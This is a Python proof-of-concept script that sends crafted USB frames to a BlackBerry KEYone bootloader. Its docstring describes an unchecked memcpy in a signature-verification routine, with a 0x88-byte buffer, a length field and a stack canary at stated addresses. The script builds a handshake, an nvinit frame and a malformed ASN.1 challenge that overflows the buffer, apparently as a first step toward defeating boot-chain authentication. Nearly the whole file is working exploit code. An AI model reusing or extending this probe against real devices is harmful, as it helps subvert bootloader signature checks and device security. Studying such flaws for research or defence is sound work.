#!/usr/bin/env python3
"""auth_canary.py - KEYone ABL766 nv_sig stack-overflow canary probe.

Chain: handshake (0x2000) -> 0x1016 (sets [ctx+0x75c], sends nv challenge)
       -> 0x2005 records -> rtas_verify_nv_sig_response -> 0x8f658f30.

Vulnerability (0x8f658f30): memcpy(dst=sp+0x4c, src=blob+5, len=sl) with
sl = blob[4] unchecked (dst buffer 0x88 bytes). The buffer is then reversed
in place; after reversal the canary slot (buffer+0x88) holds data[0], so a
probe with sl=0x89 and data[0]=0x54 should PRESERVE the fixed canary
(global 0x8f7c2ed0 = 0x00000054, never written at runtime).

Usage:
  py -3.11 auth_canary.py probe89      # sl=0x89, data[0]=0x54 (expect no crash)
  py -3.11 auth_canary.py probe89b     # sl=0x89, data[0]=0x00 (expect canary panic if fixed)
"""
import os, sys, time, struct
for _d in (r"C:\bb10mt", os.path.dirname(os.path.abspath(__file__))):
    try: os.add_dll_directory(_d)
    except Exception: pass
import usb.core, usb.util, usb.backend.libusb1 as lb

COOKIE = 0xbba78701
def fr(code, payload=b""): return struct.pack("<II", COOKIE, code) + payload

def hs_frame():
    return fr(0x2000, struct.pack("<I", 0x00010003) + b"Linux" + struct.pack("<I", 0x78) + b"\x00" * 8)

def nvinit_frame():
    p = bytearray(b"\x00" * 0x124)
    p[0:8] = b"nvitem\x00\x00"
    p[0x20:0x28] = b"signit\x00\x00"
    p[0x120:0x124] = struct.pack("<I", 1)
    return fr(0x1016, bytes(p))

def chal_frame(sl, data0, r4_len=1):
    # data_b (ASN.1 blob): 30 81 <len-3> 02 <sl> <sl bytes> 02 <r4len> <r4len bytes>
    blob = bytearray()
    blob += b"\x30\x81"
    body_len = 4 + sl + r4_len  # 02 sl <data> 02 r4 <r4data>
    blob += bytes([body_len])
    blob += b"\x02" + bytes([sl])
    data = bytearray(b"\x41" * sl)
    data[0] = data0
    blob += data
    blob += b"\x02" + bytes([r4_len]) + b"\x00" * r4_len
    len_b = len(blob)
    # data_a: TLV sequence with type 5 and type 6 records (length varint, type varint)
    data_a = b"\x00\x05\x00\x06"
    len_a = len(data_a)
    payload = struct.pack("<IHH", 0, len_a, len_b) + data_a + bytes(blob)
    return fr(0x2005, payload)

def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else "probe89"
    if mode == "probe89":
        chal = chal_frame(0x89, 0x54)
    elif mode == "probe89b":
        chal = chal_frame(0x89, 0x00)
    else:
        print("unknown mode"); return 2

    backend = lb.get_backend(find_library=lambda x: r"C:\bb10mt\libusb-1.0.dll")
    d = usb.core.find(idVendor=0x0FCA, idProduct=0x8040, backend=backend)
    if d is None:
        print("device not found (bootloader mode required)"); return 2
    for i in (0, 1):
        try:
            if d.is_kernel_driver_active(i): d.detach_kernel_driver(i)
        except Exception: pass
    usb.util.claim_interface(d, 0); usb.util.claim_interface(d, 1)

    def rd(sec):
        t0 = time.time()
        while time.time() - t0 < sec:
            for ep, tag in ((0x82, "AUTH"), (0x81, "FB")):
                try:
                    b = d.read(ep, 4096, timeout=200).tobytes()
                    print(f"  [{tag}] {len(b)} {b[:80].hex()}")
                except usb.core.USBTimeoutError:
                    pass
            time.sleep(0.02)

    print("[*] handshake"); d.write(0x02, hs_frame()); rd(1.5)
    print("[*] 0x1016 nvinit"); d.write(0x02, nvinit_frame()); rd(1.5)
    print(f"[*] 0x2005 canary probe ({mode}): {len(chal)} bytes"); d.write(0x02, chal); rd(2)
    print("[*] done (check device liveness next)")
    usb.util.release_interface(d, 1); usb.util.release_interface(d, 0)
    return 0

if __name__ == "__main__":
    sys.exit(main())
